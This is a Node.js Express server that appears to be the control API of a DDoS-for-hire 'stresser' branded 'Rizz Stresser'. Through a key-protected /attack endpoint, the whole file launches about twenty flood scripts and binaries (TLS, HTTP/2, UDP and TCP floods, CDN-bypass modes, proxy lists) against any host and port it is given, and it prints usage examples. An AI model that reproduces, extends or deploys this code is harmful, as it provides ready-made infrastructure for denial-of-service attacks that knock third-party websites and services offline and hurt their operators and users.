const express = require('express');
const os = require('os');
const { spawn } = require('child_process');
const app = express();
const port = 2906;
const API_KEY = "Rizztzy";

// Ambil IP VPS otomatis (non-127.0.0.1)
function getVPSIp() {
  const interfaces = os.networkInterfaces();
  for (let name in interfaces) {
    for (let iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  return '127.0.0.1';
}

app.get('/attack', (req, res) => {
  try {
    const { key, host, port: targetPort, time, method } = req.query;
    if (key !== API_KEY) return res.status(401).send('Key not working');
    if (!host || !targetPort || !time || !method) return res.status(400).send('Missing params');

    let args = [];
    switch (method) {
      case 'tls': args = ['tls.js', host, time, 16, 4, 'proxy.txt']; break;
      case 'scrape': args = ['scrape.js']; break;
      case 'bypass-x': args = ['uz.js', 'GET', host, time, 2, 4, 'proxy.txt', '--query', '1', '--delay', '1', '--cookies=key', 'bypassing=%RAND%', '--bfm', 'true', '--postdata', 'user=f&pass=%RAND%', '--debug', 'true', '--cdn', 'true']; break;
      case 'h2-mix': args = ['h2-mix.js', host, time, 4, 2, 'proxy.txt']; break;
      case 'glory': args = ['glory.js', host, time, 100, 10, 'proxy.txt']; break;
      case 'storm': args = ['storm.js', host, time, 10, 4, 'proxy.txt']; break;
      case 'bypass': args = ['bypass.js', host, time, 100, 10, 'proxy.txt']; break;
      case 'h2-hold': args = ['h2-hold.js', host, time, 10, 4, 'proxy.txt']; break;
      case 'x-hit': args = ['x-hit.js', host, time, 110, 10, 'proxy.txt']; break;
      case 'h2-blast': args = ['h2-blast.js', host, time, 10, 4, 'proxy.txt']; break;
      case 'quantum': args = ['quantum.js', host, time, 16, 4, 'proxy.txt']; break;
      case 'c-f': args = ['c-f.js', host, time, 8, 3]; break;
      case 'killnet': args = ['killnet.js', host, time, 16, 4, 'proxy.txt']; break;
      case 'https': args = ['https.js', host, time, 16, 4, 'proxy.txt', 'bypass']; break;
      case 'browsern': args = ['browsern.js', host, time, 3]; break;
      case 'tls-lost': args = ['tls-lost.js', host, time, 10, 4, 'proxy.txt']; break;
      case 'tcp-pps': args = ['./tcp-pps', host, targetPort, '2', time]; break;
      case 'udp': args = ['./udp', host, targetPort, '3', time]; break;
      case 'tcp': args = ['timeout', [time, './tcp', host, targetPort, '3', '99999']]; break;
      case 'ninja': args = ['Ninja.js', host, time]; break;
      default: return res.status(400).send('Method tidak valid');
    }

    const child = spawn(args[0].startsWith('./') ? args[0] : 'node', args[0].startsWith('./') ? args.slice(1) : args);

    const html = `
      <html><body style="background:#000;color:#0f0;font-family:monospace;">
      <h2>✅ ATTACK STARTED</h2>
      <p><b>Target:</b> ${host}</p>
      <p><b>Port:</b> ${targetPort}</p>
      <p><b>Time:</b> ${time}s</p>
      <p><b>Method:</b> ${method}</p>
      <p><i>By Rizz Stresser</i></p>
      </body></html>
    `;
    res.send(html);

    child.stdout.on('data', data => console.log(`[stdout] ${data}`));
    child.stderr.on('data', data => console.error(`[stderr] ${data}`));
    child.on('close', code => console.log(`Process exited with code ${code}`));

  } catch (err) {
    console.error(err);
    res.status(500).send('Internal Server Error');
  }
});

app.listen(port, '0.0.0.0', () => {
  const ip = getVPSIp();
  console.clear();
  console.log(`
╔══════════════════════════════════╗
║   🚀 RIZZ API ATTACK READY       ║
╠══════════════════════════════════╣
║ 🔑 Key   : ${API_KEY}
║ 🌐 URL   : http://${ip}:${port}/attack
║ 📘 Usage : /attack?key=KEY&host=HOST&port=PORT&time=SECONDS&method=METHOD
╚══════════════════════════════════╝

Contoh:
➡️  http://${ip}:${port}/attack?key=Rizztzy&host=example.com&port=443&time=60&method=https
`);
});